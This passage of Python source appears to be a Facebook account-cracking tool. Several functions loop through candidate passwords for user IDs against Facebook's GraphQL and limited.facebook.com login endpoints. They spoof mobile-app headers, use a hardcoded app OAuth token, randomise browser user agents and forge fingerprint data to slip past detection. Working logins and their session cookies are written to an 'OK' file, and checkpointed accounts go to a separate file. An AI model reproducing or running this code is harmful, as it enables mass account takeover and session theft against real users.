                'client_doc_id': '11994080425603935587861051615',
                'variables': json.dumps({"params":{"params":"{\"params\":\"{\\\"client_input_params\\\":{\\\"device_id\\\":\\\"db00d712-bd44-4358-bcf2-2fe14e2885d2\\\",\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\",\\\"lara_override\\\":\\\"\\\"},\\\"name\\\":null,\\\"machine_id\\\":\\\"FXQ7Z_eNU42Pnt5I_CpRlzIh\\\",\\\"profile_pic_url\\\":null,\\\"contact_point\\\":\\\""+uid+"\\\",\\\"encrypted_password\\\":\\\""+apcb+"\\\"},\\\"server_params\\\":{\\\"is_from_logged_out\\\":1,\\\"layered_homepage_experiment_group\\\":null,\\\"device_id\\\":\\\"db00d712-bd44-4358-bcf2-2fe14e2885d2\\\",\\\"waterfall_id\\\":\\\"278dd0ac-58b3-46e4-aa8e-ea55021589a6\\\",\\\"INTERNAL__latency_qpl_instance_id\\\":2.9809277900605E13,\\\"login_source\\\":\\\"Login\\\",\\\"is_platform_login\\\":0,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"family_device_id\\\":\\\"db00d712-bd44-4358-bcf2-2fe14e2885d2\\\",\\\"offline_experiment_group\\\":\\\"caa_iteration_v6_perf_fb_2\\\",\\\"INTERNAL_INFRA_THEME\\\":\\\"default,default\\\",\\\"access_flow_version\\\":\\\"F2_FLOW\\\",\\\"is_from_logged_in_switcher\\\":0}}\"}","bloks_versioning_id":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5","app_id":"com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request"},"scale":"2","nt_context":{"using_white_navbar":True,"styles_id":"cfe75e13b386d5c54b1de2dcca1bee5a","pixel_ratio":2,"is_push_on":False,"debug_tooling_metadata_token":None,"is_flipper_enabled":False,"theme_params":[],"bloks_version":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"}}),
                'fb_api_analytics_tags': '["GraphServices"]',
                'client_trace_id': 'c4663a0f-a919-4454-bf17-3d542589eafe'}
            encode = urllib.parse.urlencode(data, doseq=True)
            response = ses.post('https://graph.facebook.com/graphql', data=encode)
            if "session_key" in response.text and "uid" in response.text:
                ok+=1
                print(f"\r{H}[ OK ] {uid}|{pw}{P}")
                open('ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}\n")
                break
            elif "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                ok+=1
                print(f"\r{H}[ OK ] {uid}|{pw}{P}")
                open('ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}\n")
                break
            elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                cp+=1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}")
                open('ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
                break
            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
                cp+=1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}")
                open('ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:time.sleep(30)
    loop+=1


def APS(uid,pasw):
    global loop,ok,cp
    print(f"\r {H}LOAD{P} {str(loop)}/{len(id)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}",end="")
    ses = requests.Session()
    for pw in pasw:
        try:
            ua = generate_dalvik_user_agent()
            ses.headers.update({
                'host': 'b-graph.facebook.com',
				'x-fb-connection-type': 'MOBILE.LTE',
				'x-zero-state': 'unknown',
				'user-agent': x1(),
				'x-tigon-is-retry': 'False',
				'x-fb-device-group': '4783',
				'x-graphql-request-purpose': 'fetch',
				'x-fb-privacy-context': '3643298472347298',
				'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
				'x-graphql-client-library': 'graphservice',
				'content-type': 'application/x-www-form-urlencoded',
				'x-fb-net-hni': '51011',
				'x-fb-sim-hni': '51011',
				'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
				'x-fb-http-engine': 'Tigon/Liger',
				'x-fb-client-ip': 'True',
				'x-fb-server-cluster': 'True'
            })
            enpas = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
            data = {
                'method': "post",
                'pretty': "false",
                'format': "json",
				'server_timestamps': "true",
				'locale': "id_ID",
				'purpose': "fetch",
				'fb_api_req_friendly_name': "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
				'fb_api_caller_class': "graphservice",
				'client_doc_id': "119940804214876861379510865434",
			    'variables': json.dumps({"params":{"params":"{\"params\":\"{\\\"client_input_params\\\":{\\\"sim_phones\\\":[],\\\"secure_family_device_id\\\":\\\"67db191d-c496-4ce6-b16a-40d465504065\\\",\\\"attestation_result\\\":{\\\"data\\\":\\\"eyJjaGFsbGVuZ2Vfbm9uY2UiOiIrZHJubFJJdndKSkxmUnR4TkdLRWlscWRHOUc2KzJPZWdsY1gyN1d0UEEwPSIsInVzZXJuYW1lIjoieHlhZmFqYXJAZ21haWwuY29tIn0=\\\",\\\"signature\\\":\\\"MEQCIDireQS4hTnMyBiyJckHln2WFJ65OU6a31Bx6JGyCjttAiBpZw4ixxyyyNNC0xMgiqmiAd1rVi8ZGsfyTrqvBIibqw==\\\",\\\"keyHash\\\":\\\"f344d852976b8878bd5ccda3f95074528c7564fcebcde45abc51c9b43bc234e4\\\"},\\\"has_granted_read_contacts_permissions\\\":0,\\\"auth_secure_device_id\\\":\\\"\\\",\\\"has_whatsapp_installed\\\":1,\\\"password\\\":\\\""+enpas+"\\\",\\\"sso_token_map_json_string\\\":\\\"\\\",\\\"event_flow\\\":\\\"login_manual\\\",\\\"password_contains_non_ascii\\\":\\\"false\\\",\\\"sim_serials\\\":[],\\\"client_known_key_hash\\\":\\\"\\\",\\\"encrypted_msisdn\\\":\\\"\\\",\\\"has_granted_read_phone_permissions\\\":0,\\\"app_manager_id\\\":\\\"\\\",\\\"should_show_nested_nta_from_aymh\\\":0,\\\"device_id\\\":\\\"41889e22-bee8-4c81-8ec6-add9a221bd3f\\\",\\\"login_attempt_count\\\":1,\\\"machine_id\\\":\\\"\\\",\\\"flash_call_permission_status\\\":{\\\"READ_PHONE_STATE\\\":\\\"DENIED\\\",\\\"READ_CALL_LOG\\\":\\\"DENIED\\\",\\\"ANSWER_PHONE_CALLS\\\":\\\"DENIED\\\"},\\\"accounts_list\\\":[{},{}],\\\"family_device_id\\\":\\\"f7eab582-f690-4123-b350-132bb5ec5500\\\",\\\"fb_ig_device_id\\\":[],\\\"device_emails\\\":[],\\\"try_num\\\":1,\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\",\\\"lara_override\\\":\\\"\\\"},\\\"event_step\\\":\\\"home_page\\\",\\\"headers_infra_flow_id\\\":\\\"\\\",\\\"openid_tokens\\\":{},\\\"contact_point\\\":\\\""+uid+"\\\"},\\\"server_params\\\":{\\\"should_trigger_override_login_2fa_action\\\":0,\\\"is_from_logged_out\\\":0,\\\"should_trigger_override_login_success_action\\\":0,\\\"login_credential_type\\\":\\\"none\\\",\\\"server_login_source\\\":\\\"login\\\",\\\"waterfall_id\\\":\\\"12020f76-d875-4059-82fc-93f8debb8784\\\",\\\"login_source\\\":\\\"Login\\\",\\\"is_platform_login\\\":0,\\\"pw_encryption_try_count\\\":1,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"offline_experiment_group\\\":\\\"caa_iteration_v6_perf_fb_2\\\",\\\"is_from_landing_page\\\":0,\\\"password_text_input_id\\\":\\\"6vcvjp:102\\\",\\\"is_from_empty_password\\\":0,\\\"is_from_msplit_fallback\\\":0,\\\"ar_event_source\\\":\\\"login_home_page\\\",\\\"username_text_input_id\\\":\\\"6vcvjp:101\\\",\\\"layered_homepage_experiment_group\\\":null,\\\"device_id\\\":\\\"41889e22-bee8-4c81-8ec6-add9a221bd3f\\\",\\\"INTERNAL__latency_qpl_instance_id\\\":4.154659090078E13,\\\"reg_flow_source\\\":\\\"login_home_native_integration_point\\\",\\\"is_caa_perf_enabled\\\":1,\\\"credential_type\\\":\\\"password\\\",\\\"is_from_password_entry_page\\\":0,\\\"caller\\\":\\\"gslr\\\",\\\"family_device_id\\\":\\\"f7eab582-f690-4123-b350-132bb5ec5500\\\",\\\"is_from_assistive_id\\\":0,\\\"access_flow_version\\\":\\\"F2_FLOW\\\",\\\"is_from_logged_in_switcher\\\":0}}\"}","bloks_versioning_id":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5","app_id":"com.bloks.www.bloks.caa.login.async.send_login_request"},"scale":"3","nt_context":{"using_white_navbar":True,"styles_id":"cfe75e13b386d5c54b1de2dcca1bee5a","pixel_ratio":3,"is_push_on":True,"debug_tooling_metadata_token":None,"is_flipper_enabled":False,"theme_params":[],"bloks_version":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"}}),
				'fb_api_analytics_tags': '["GraphServices"]',
				'client_trace_id': str(uuid.uuid4())
            }
            response = ses.post('https://b-graph.facebook.com/graphql', data=data, allow_redirects=True)
            if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                cokie = {
                    "datr": re.search('"name":"datr","value":"(.*?)"', response.text.replace('\\', '')).group(1),
					"sb": base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-"),
					"fr": re.search('"name":"fr","value":"(.*?)"', response.text.replace('\\', '')).group(1),
					"c_user": re.search('"name":"c_user","value":"(\d+)"', response.text.replace('\\', '')).group(1),
					"xs": re.search('"name":"xs","value":"(.*?)"', response.text.replace('\\', '')).group(1),
                }
                cookie = ';'.join(f'{key}={value}' for key, value in cokie.items())
                print(f"\r{H}[ OK ] {uid}|{pw}|{cookie}{P}")
                open('ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}|{cookie}\n")
                break
            elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                cp+=1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}")
                open('ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
                break
            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
                cp+=1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}")
                open('ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:time.sleep(30)
    loop+=1


def APU(uid,pasw):
    global loop,ok,cp
    print(f"\r {H}LOAD{P} {str(loop)}/{len(id)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}",end="")
    ses = requests.Session()
    for pw in pasw:
        try:
            device_id_val = str(uuid.uuid4())
            family_device_id_val = str(uuid.uuid4())
            app_scope_id_val = str(uuid.uuid4())
            zero_f_device_id_val = str(uuid.uuid4())
            machine_id_val = generate_machine_id()
            usdid_val = generate_usdid()
            headers = {
                'Host': 'b-graph.facebook.com',
                'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"graphservice"}',
                'Priority': 'u=0',
                'X-Zero-Eh': '664c0faaac849cb891d0a261fbb72a12',
                'User-Agent': x1(),
                'X-Fb-Friendly-Name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
                'X-Zero-F-Device-Id': zero_f_device_id_val,
                'X-Graphql-Request-Purpose': 'fetch',
                'X-Fb-Device-Group': '4025',
                'X-Tigon-Is-Retry': 'False',
                'X-Graphql-Client-Library': 'graphservice',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Fb-Net-Hni': '51000',
                'X-Fb-Sim-Hni': '51000',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-Zero-State': 'unknown',
                'X-Meta-Zca': 'empty_token',
                'App-Scope-Id-Header': app_scope_id_val,
                'X-Fb-Connection-Type': 'WIFI',
                'X-Meta-Usdid': usdid_val,
                'X-Fb-Http-Engine': 'Tigon/Liger',
                'X-Fb-Client-Ip': 'True',
                'X-Fb-Server-Cluster': 'True',
                'X-Fb-Conn-Uuid-Client': generate_conn_uuid(),
            }
            apcb = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
            params = {
                "method": "post",
                "pretty": "false",
                "format": "json",
                "server_timestamps": "true",
                "locale": "id_ID",
                "purpose": "fetch",
                "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                "fb_api_caller_class": "graphservice",
                "client_doc_id": "119940804217734265480409226803",
                "fb_api_client_context": json.dumps({
                    "is_background": False
                }),
                "variables": json.dumps({
                    "params": {
                        "params": json.dumps({
                            "params": json.dumps({
                                "server_params": {
                                    "device_id": device_id_val,
                                    "server_login_source": "login",
                                    "waterfall_id": str(uuid.uuid4()),
                                    "attestation_result": {
                                        "errorMessage": "KeyAttestationException: No key found!"
                                    },
                                    "machine_id": machine_id_val,
                                    "from_native_screen": True,
                                    "credential_type": "password",
                                    "password": apcb,
                                    "try_num": "1",
                                    "family_device_id": family_device_id_val,
                                    "event_flow": "login_manual",
                                    "event_step": "home_page",
                                    "is_from_logged_in_switcher": False,
                                    "contact_point": uid,
                                }
                            })
                        }),
                        "bloks_versioning_id": "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a",
                        "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
                    },
                    "scale": "2",
                    "nt_context": {
                        "using_white_navbar": True,
                        "styles_id": "6100e7e89411ccf67ace027cedecd84f",
                        "pixel_ratio": 2,
                        "is_push_on": True,
                        "debug_tooling_metadata_token": None,
                        "is_flipper_enabled": False,
                        "theme_params": [
                            {
                                "value": [],
                                "design_system_name": "FDS"
                            }
                        ],
                        "bloks_version": "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a",
                    }
                }),
                "fb_api_analytics_tags": json.dumps(["GraphServices"]),
                "client_trace_id": str(uuid.uuid4()),
            }
            z = ses.post('https://b-graph.facebook.com/graphql', headers=headers, params=params)
            if "c_user" in z.text.replace('\\', '') and "access_token" in z.text:
                ok+=1
                print(f"\r{H}[ OK ] {uid}|{pw}{P}")
                open('ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}\n")
                break
            elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in z.text:
                cp+=1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}")
                open('ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
                break
            elif "error_user_title" in z.text.replace('\\', '') and "checkpoint" in z.text.replace('\\', ''):
                cp+=1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}")
                open('ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:time.sleep(30)
    loop+=1


def _extract_web_tokens(html_text):
    lsd = ''
    m_ts = ''
    li = ''
    jazoest = ''
    dtsg = ''
    try:
        m = re.search(r'name=["\']lsd["\']\s+value=["\']([^"\']+)["\']', html_text)
        if not m:
            m = re.search(r'<input[^>]+name=["\']lsd["\'][^>]+value=["\']([^"\']+)["\']', html_text)
        if not m:
            m = re.search(r'"lsd"\s*[,:]\s*["\']?([A-Za-z0-9_\-]+)["\']?', html_text)
        if m:
            lsd = m.group(1)
    except:
        pass
    try:
        m = re.search(r'name=["\']m_ts["\']\s+value=["\']([^"\']+)["\']', html_text)
        if not m:
            m = re.search(r'<input[^>]+name=["\']m_ts["\'][^>]+value=["\']([^"\']+)["\']', html_text)
        if not m:
            m = re.search(r'name=["\']m_ts["\'][^>]*value=["\']([^"\']+)["\']', html_text)
        if m:
            m_ts = m.group(1)
    except:
        pass
    try:
        m = re.search(r'name=["\']li["\']\s+value=["\']([^"\']+)["\']', html_text)
        if not m:
            m = re.search(r'<input[^>]+name=["\']li["\'][^>]+value=["\']([^"\']+)["\']', html_text)
        if not m:
            m = re.search(r'name=["\']li["\'][^>]*value=["\']([^"\']+)["\']', html_text)
        if m:
            li = m.group(1)
    except:
        pass
    try:
        m = re.search(r'name=["\']jazoest["\']\s+value=["\']([^"\']+)["\']', html_text)
        if not m:
            m = re.search(r'<input[^>]+name=["\']jazoest["\'][^>]+value=["\']([^"\']+)["\']', html_text)
        if not m:
            m = re.search(r'name=["\']jazoest["\'][^>]*value=["\']([^"\']+)["\']', html_text)
        if m:
            jazoest = m.group(1)
    except:
        pass
    try:
        m = re.search(r'"dtsg"\s*:\s*\{[^}]*"token"\s*:\s*"([^"]+)"', html_text)
        if not m:
            m = re.search(r'"token"\s*:\s*"([A-Za-z0-9_\-:]+:[0-9]+:[0-9]+)"', html_text)
        if not m:
            m = re.search(r'<input[^>]+name=["\']fb_dtsg["\'][^>]+value=["\']([^"\']+)["\']', html_text)
        if not m:
            m = re.search(r'name=["\']fb_dtsg["\']\s+value=["\']([^"\']+)["\']', html_text)
        if not m:
            m = re.search(r'DTSGInitData[^"]*"token"\s*:\s*"([^"]+)"', html_text)
        if m:
            dtsg = m.group(1)
    except:
        pass
    try:
        if not lsd:
            m = re.search(r'"lsd"\s*:\s*"([^"]+)"', html_text)
            if m:
                lsd = m.group(1)
    except:
        pass
    return lsd, m_ts, li, jazoest, dtsg


def _generate_ua_apui():
    chrome_ver  = random.randint(120, 149)
    firefox_ver = random.randint(118, 136)
    edge_ver    = random.randint(120, 148)
    patch_ver   = random.randint(6000, 8500)
    sub_ver     = random.randint(100, 300)

    android_devices = [
        ('13',  'Pixel 7',          'BP1A.240505.004'),
        ('13',  'Pixel 7 Pro',      'TQ3A.230901.001'),
        ('14',  'Pixel 8',          'AD1A.240905.004'),
        ('14',  'Pixel 8 Pro',      'UQ1A.231205.015'),
        ('15',  'Pixel 9',          'AP3A.241205.013'),
        ('13',  'SM-S918B',         'TP1A.220624.014'),
        ('13',  'SM-A546B',         'TP1A.220624.014'),
        ('12',  'SM-G991B',         'SP1A.210812.016'),
        ('14',  'CPH2447',          'UP1A.231005.007'),
        ('13',  'M2102J20SG',       'TP1A.220624.014'),
        ('14',  'V2309A',           'UP1A.231005.007'),
    ]

    windows_versions = ['10.0', '11.0']
    mac_versions     = ['10_15_7', '11_0_0', '12_0_0', '13_0_0', '14_0_0']

    ua_type = random.choice([
        'chrome_android',
        'chrome_android',
        'chrome_android',
        'chrome_windows',
        'chrome_mac',
        'edge_windows',
        'firefox_android',
        'firefox_windows',
    ])

    if ua_type == 'chrome_android':
        av, dev, build = random.choice(android_devices)
        ua = (
            f'Mozilla/5.0 (Linux; Android {av}; {dev} Build/{build}) '
            f'AppleWebKit/537.36 (KHTML, like Gecko) '
            f'Chrome/{chrome_ver}.0.0.0 Mobile Safari/537.36'
        )
        sec_ch_ua = (
            f'"Chromium";v="{chrome_ver}", '
            f'"Google Chrome";v="{chrome_ver}", '
            f'"Not-A.Brand";v="24"'
        )
        sec_ch_ua_full_version_list = (
            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
            f'"Google Chrome";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
            f'"Not-A.Brand";v="24.0.0.0"'
        )
        sec_ch_ua_mobile           = '?1'
        sec_ch_ua_model            = f'"{dev}"'
        sec_ch_ua_platform         = '"Android"'
        sec_ch_ua_platform_version = f'"{av}.0.0"'

    elif ua_type == 'chrome_windows':
        wv = random.choice(windows_versions)
        ua = (
            f'Mozilla/5.0 (Windows NT {wv}; Win64; x64) '
            f'AppleWebKit/537.36 (KHTML, like Gecko) '
            f'Chrome/{chrome_ver}.0.0.0 Safari/537.36'
        )
        sec_ch_ua = (
            f'"Chromium";v="{chrome_ver}", '
            f'"Google Chrome";v="{chrome_ver}", '
            f'"Not-A.Brand";v="24"'
        )
        sec_ch_ua_full_version_list = (
            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
            f'"Google Chrome";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
            f'"Not-A.Brand";v="24.0.0.0"'
        )
        sec_ch_ua_mobile           = '?0'
        sec_ch_ua_model            = '""'
        sec_ch_ua_platform         = '"Windows"'
        sec_ch_ua_platform_version = f'"{wv}.0"'

    elif ua_type == 'chrome_mac':
        mv = random.choice(mac_versions)
        mv_dot = mv.replace('_', '.')
        ua = (
            f'Mozilla/5.0 (Macintosh; Intel Mac OS X {mv}) '
            f'AppleWebKit/537.36 (KHTML, like Gecko) '
            f'Chrome/{chrome_ver}.0.0.0 Safari/537.36'
        )
        sec_ch_ua = (
            f'"Chromium";v="{chrome_ver}", '
            f'"Google Chrome";v="{chrome_ver}", '
            f'"Not-A.Brand";v="24"'
        )
        sec_ch_ua_full_version_list = (
            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
            f'"Google Chrome";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
            f'"Not-A.Brand";v="24.0.0.0"'
        )
        sec_ch_ua_mobile           = '?0'
        sec_ch_ua_model            = '""'
        sec_ch_ua_platform         = '"macOS"'
        sec_ch_ua_platform_version = f'"{mv_dot}"'

    elif ua_type == 'edge_windows':
        wv = random.choice(windows_versions)
        ua = (
            f'Mozilla/5.0 (Windows NT {wv}; Win64; x64) '
            f'AppleWebKit/537.36 (KHTML, like Gecko) '
            f'Chrome/{chrome_ver}.0.0.0 Safari/537.36 '
            f'Edg/{edge_ver}.0.0.0'
        )
        sec_ch_ua = (
            f'"Chromium";v="{chrome_ver}", '
            f'"Microsoft Edge";v="{edge_ver}", '
            f'"Not-A.Brand";v="24"'
        )
        sec_ch_ua_full_version_list = (
            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
            f'"Microsoft Edge";v="{edge_ver}.0.{patch_ver}.{sub_ver}", '
            f'"Not-A.Brand";v="24.0.0.0"'
        )
        sec_ch_ua_mobile           = '?0'
        sec_ch_ua_model            = '""'
        sec_ch_ua_platform         = '"Windows"'
        sec_ch_ua_platform_version = f'"{wv}.0"'

    elif ua_type == 'firefox_android':
        av, dev, build = random.choice(android_devices)
        ua = (
            f'Mozilla/5.0 (Android {av}; Mobile; rv:{firefox_ver}.0) '
            f'Gecko/{firefox_ver}.0 Firefox/{firefox_ver}.0'
        )
        sec_ch_ua                  = ''
        sec_ch_ua_full_version_list = ''
        sec_ch_ua_mobile           = '?1'
        sec_ch_ua_model            = f'"{dev}"'
        sec_ch_ua_platform         = '"Android"'
        sec_ch_ua_platform_version = f'"{av}.0.0"'

    else:  # firefox_windows
        wv = random.choice(windows_versions)
        ua = (
            f'Mozilla/5.0 (Windows NT {wv}; Win64; x64; rv:{firefox_ver}.0) '
            f'Gecko/{firefox_ver}.0 Firefox/{firefox_ver}.0'
        )
        sec_ch_ua                  = ''
        sec_ch_ua_full_version_list = ''
        sec_ch_ua_mobile           = '?0'
        sec_ch_ua_model            = '""'
        sec_ch_ua_platform         = '"Windows"'
        sec_ch_ua_platform_version = f'"{wv}.0"'

    return {
        'ua':                          ua,
        'sec_ch_ua':                   sec_ch_ua,
        'sec_ch_ua_full_version_list': sec_ch_ua_full_version_list,
        'sec_ch_ua_mobile':            sec_ch_ua_mobile,
        'sec_ch_ua_model':             sec_ch_ua_model,
        'sec_ch_ua_platform':          sec_ch_ua_platform,
        'sec_ch_ua_platform_version':  sec_ch_ua_platform_version,
    }


def APUI(uid, pasw):
    global loop, ok, cp
    print(f"\r {H}LOAD{P} {str(loop)}/{len(id)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}", end="")
    ses = requests.Session()
    for pw in pasw:
        try:
            _ua = _generate_ua_apui()
            _agent    = _ua['ua']
            _sch_ua   = _ua['sec_ch_ua']
            _sch_mob  = _ua['sec_ch_ua_mobile']
            _sch_plat = _ua['sec_ch_ua_platform']

            url = 'https://limited.facebook.com/login/'
            headi = {
                'Host': 'limited.facebook.com',
                'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': _agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Priority': 'u=0, i',
            }
            if _sch_ua:
                headi['Sec-Ch-Ua']          = _sch_ua
                headi['Sec-Ch-Ua-Mobile']   = _sch_mob
                headi['Sec-Ch-Ua-Platform'] = _sch_plat

            link = ses.get(url, headers=headi)
            page_html = link.text
            lsd, m_ts, li, jazoest, dtsg = _extract_web_tokens(page_html)
            headers = {
                'accept': '*/*',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://limited.facebook.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://limited.facebook.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': _agent,
                'x-asbd-id': '359341',
                'x-fb-lsd': lsd,
                'x-requested-with': 'XMLHttpRequest',
                'x-response-format': 'JSONStream',
            }
            if _sch_ua:
                headers['sec-ch-ua']          = _sch_ua
                headers['sec-ch-ua-mobile']   = _sch_mob
                headers['sec-ch-ua-platform'] = _sch_plat
            params = {
                'refsrc': 'deprecated',
                'lwv': '100',
            }
            apcb = '#PWD_BROWSER:0:{}:{}'.format(str(int(time.time())), pw)
            data = {
                'm_ts': m_ts,
                'li': li,
                'try_number': '0',
                'unrecognized_tries': '0',
                'email': uid,
                'prefill_contact_point': uid,
                'prefill_source': 'browser_dropdown',
                'prefill_type': 'contact_point',
                'first_prefill_source': 'browser_dropdown',
                'first_prefill_type': 'contact_point',
                'had_cp_prefilled': 'true',
                'had_password_prefilled': 'false',
                'is_smart_lock': 'false',
                'bi_xrwh': '0',
                'bi_wvdp': json.dumps({
                    "hwc": True,
                    "hwcr": False,
                    "has_dnt": True,
                    "has_standalone": False,
                    "wnd_toStr_toStr": "function toString() { [native code] }",
                    "hasPerm": True,
                    "permission_query_toString": "function query() { [native code] }",
                    "permission_query_toString_toString": "function toString() { [native code] }",
                    "has_seWo": True,
                    "has_meDe": True,
                    "has_creds": True,
                    "has_hwi_bt": False,
                    "has_agjsi": False,
                    "iframeProto": "function get contentWindow() { [native code] }",
                    "remap": False,
                    "iframeData": {
                        "hwc": True,
                        "hwcr": False,
                        "has_dnt": True,
                        "has_standalone": False,
                        "wnd_toStr_toStr": "function toString() { [native code] }",
                        "hasPerm": True,
                        "permission_query_toString": "function query() { [native code] }",
                        "permission_query_toString_toString": "function toString() { [native code] }",
                        "has_seWo": True,
                        "has_meDe": True,
                        "has_creds": True,
                        "has_hwi_bt": False,
                        "has_agjsi": False
                    }
                }, separators=(',', ':')),
                'encpass': apcb,
                'fb_dtsg': dtsg,
                'jazoest': jazoest,
                'lsd': lsd,
                '__dyn': '',
                '__csr': '',
                '__hsdp': '',
                '__hblp': '',
                '__sjsp': '',
                '__req': '4',
                '__fmt': '1',
                '__a': 'AYyRMp-GrtGuwkadrW9dshNKzW22Nza0SAsdr7pkC4Wbol8yDWfP9rYK9jPSTsWLmTct7p42tceetgI5Wv_s3p18zniAr3Viz98',
                '__user': '0'
            }
            z = ses.post('https://limited.facebook.com/login/device-based/login/async/',headers=headers,params=params,data=data)
            cookies_dict = ses.cookies.get_dict()
            if "c_user" in cookies_dict:
                ok += 1
                uids = cookies_dict.get('c_user', uid)
                coki = "; ".join([f"{k}={v}" for k, v in cookies_dict.items()])
                print(f"\r{H}[ OK ] {uids}|{pw}|{coki}{P}")
                open('ESBFLIVE/' + okc, 'a').write(f"{uids}|{pw}|{coki}\n")
                break
            elif "checkpoint" in cookies_dict:
                cp += 1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}")
                open('ESBFCHEK/' + cpc, 'a').write(f"{uid}|{pw}\n")
                break
            else:
                ses = requests.Session()
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(30)
        except Exception:
            continue
    loop += 1


def APUIIII(uid, pasw):
    global loop, ok, cp
    print(f"\r {H}LOAD{P} {str(loop)}/{len(id)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}", end="")
    ses = requests.Session()
    pro = rc(ugen)
    for pw in pasw:
        try:
